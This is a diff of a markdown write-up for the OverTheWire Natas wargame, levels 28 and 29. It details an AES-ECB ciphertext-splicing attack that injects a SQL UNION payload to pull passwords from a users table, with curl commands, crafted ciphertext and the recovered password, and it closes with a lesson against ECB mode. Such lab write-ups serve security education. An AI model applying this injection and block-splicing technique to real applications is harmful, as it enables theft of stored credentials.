@@ -3258,10 +3258,10 @@ From this point on, I will also refer to the **Hacker4Help series** when [ChatGP
 
 ### Level 28
 
-- **Date**: 2026-04-29
+- **Date**: 2026-04-30 (solved, not documented)
 - **URL**: `http://natas28.natas.labs.overthewire.org`
 - **Password**: `1JNwQM1Oi6J6j1k49Xyw7ZN6pXMQInVj`
-- **Tools**: Web Browser, `curl`, `PHP`
+- **Tools**: Web Browser, `curl`, `PHP`, `SQL`
 
 #### The Solution
 
@@ -3445,8 +3445,7 @@ For our `SQL` injection, we will need to use `'` to break out of the string cont
 If we suspect SQL-style escaping is happening, then `'` would be transformed into `\'` before the query is processed further.
 This means that `AAAAAAAAA'` would effectively become `AAAAAAAAA\'`.
 
-If `AAAAAAAAA'` and `AAAAAAAAA\` produce the same stable block segment, then at this alignment point they likely result in the same effective plaintext block before encryption.
-Under the SQL-escaping hypothesis, this is consistent with `'` being transformed into `\'`, so `AAAAAAAAA'` would effectively become `AAAAAAAAA\'`.
+If `AAAAAAAAA'` and `AAAAAAAAA\` produce the same stable ciphertext segment, then this suggests they are being transformed into the same plaintext segment before encryption. Under the SQL-escaping hypothesis, this is consistent with `'` being transformed into `\'`, meaning `AAAAAAAAA'` would effectively become `AAAAAAAAA\'`.
 
 Let's test this hypothesis by sending both `AAAAAAAAA'` and `AAAAAAAAA\` as queries and checking if they produce the same stable block.
 
@@ -3460,7 +3459,99 @@ Location: search.php/?query=G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPIW
 Location: search.php/?query=G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPIWJ2pwLjKxd0ddiQ3a1c5lfN5woKhSkQjlY0g5eVSYncqM9OYQkTq645oGdhkgSlo%3D
 ```
 
-Both query strings have the `IWJ2pwLjKxd0ddiQ3a1c5lstdkbwCSk` after the fixed prefix!
+Both query strings have the `IWJ2pwLjKxd0ddiQ3a1c5l` after the fixed prefix!
 
 Which supports our working hypothesis and attack vector.
+
+We now move to **ciphertext splicing**.
+
+Because AES-ECB encrypts each block independently, we can take valid ciphertext segments and recombine them like **LEGO** bricks.
+
+Our strategy is to use two types of crafted inputs:
+
+`$query = "AAAAAAAAA' UNION SELECT ALL password FROM users; -- "`
+
+And then run `curl.exe -s -D - -o NUL -u natas28:1JNwQM1Oi6J6j1k49Xyw7ZN6pXMQInVj -d "query=$query" "http://natas28.natas.labs.overthewire.org/index.php" | select-string 'Location'`.
+
+Output:
+```txt
+Location:
+search.php/?query=G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPIWJ2pwLjKxd0ddiQ3a1c5l%2B76GKJOY6adng39QUMPprGe5X2vrsM8BRZAxT9Bt8cmSBdGBYutGkE7dxkKLuB1QrDuHHBxEg4a0XNNtno9y9GVRSbu6ISPYnZVBfqJ%2FOns%3D
+```
+
+Remember that both `AAAAAAAAA'` and `AAAAAAAAA\` produce `IWJ2pwLjKxd0ddiQ3a1c5l` after the fixed prefix.
+
+So if we remove the prefix ànd this **bad block**, we get our `SQL` query string:
+```txt
+%2B76GKJOY6adng39QUMPprGe5X2vrsM8BRZAxT9Bt8cmSBdGBYutGkE7dxkKLuB1QrDuHHBxEg4a0XNNtno9y9GVRSbu6ISPYnZVBfqJ%2FOns%3D
+```
+
+`$query = "          "`
+
+Output:
+```txt
+Location: search.php/?query=G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPItlMM3qTizkRB5P2zYxJsbc4pf%2B0pFACRndRda5Za71vNN8znGntzhH2ZQu87WJwI%3D
+```
+
+We want to keep the prefix and the **dummy block**.
+
+But first we need to determine what the plaintext segment for that dummy block is!
+
+Try these:
+
+`$query = "          A"`:
+```txt
+Location: search.php/?query=G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPItlMM3qTizkRB5P2zYxJsbNjNpR93%2FBz0TLCI5HmVRCMqM9OYQkTq645oGdhkgSlo%3D
+```
+
+`$query = "          B"`:
+```txt
+Location: search.php/?query=G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPItlMM3qTizkRB5P2zYxJsbc76UDldhGn%2FdQQrmesKP9sqM9OYQkTq645oGdhkgSlo%3D
+```
+
+The **dummy block** is `ItlMM3qTizkRB5P2zYxJsb`.
+
+Now let's strip everything after the dummy block:
+```txt
+G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPItlMM3qTizkRB5P2zYxJsb
+```
+
+And add our `SQL` injection block:
+```txt
+G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPItlMM3qTizkRB5P2zYxJsb%2B76GKJOY6adng39QUMPprGe5X2vrsM8BRZAxT9Bt8cmSBdGBYutGkE7dxkKLuB1QrDuHHBxEg4a0XNNtno9y9GVRSbu6ISPYnZVBfqJ%2FOns%3D
+```
+
+We basically replaced the **bad block** with the **dummy block**.
+
+And now simply run:
+```powershell
+curl.exe -s -u natas28:1JNwQM1Oi6J6j1k49Xyw7ZN6pXMQInVj `
+"http://natas28.natas.labs.overthewire.org/search.php/?query=G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPItlMM3qTizkRB5P2zYxJsb%2B76GKJOY6adng39QUMPprGe5X2vrsM8BRZAxT9Bt8cmSBdGBYutGkE7dxkKLuB1QrDuHHBxEg4a0XNNtno9y9GVRSbu6ISPYnZVBfqJ%2FOns%3D"
+```
+
+(Or directly put that URL in the browser.)
+
+Output:
+```html
+<h2> Whack Computer Joke Database</h2><ul><li>31F4j3Qi2PnuhIZQokxXk1L3QT9Cppns</li></ul>
+```
+
+And the password for natas29 is `31F4j3Qi2PnuhIZQokxXk1L3QT9Cppns`.
+
+#### The Lesson
+
+Don’t use **ECB** mode for encryption, as it allows block-swapping attacks. Use secure modes like **CBC** or **GCM** instead.
+
+## Level 29
+
+- **Date**: 2026-04-30 (solved, not documented)
+- **URL**: `http://natas29.natas.labs.overthewire.org`
+- **Password**: `31F4j3Qi2PnuhIZQokxXk1L3QT9Cppns`
+- **Tools**: Web Browser
+
+#### The Solution
+
+Use CTRL + U to view the page source. And notice:
+
+```html
 
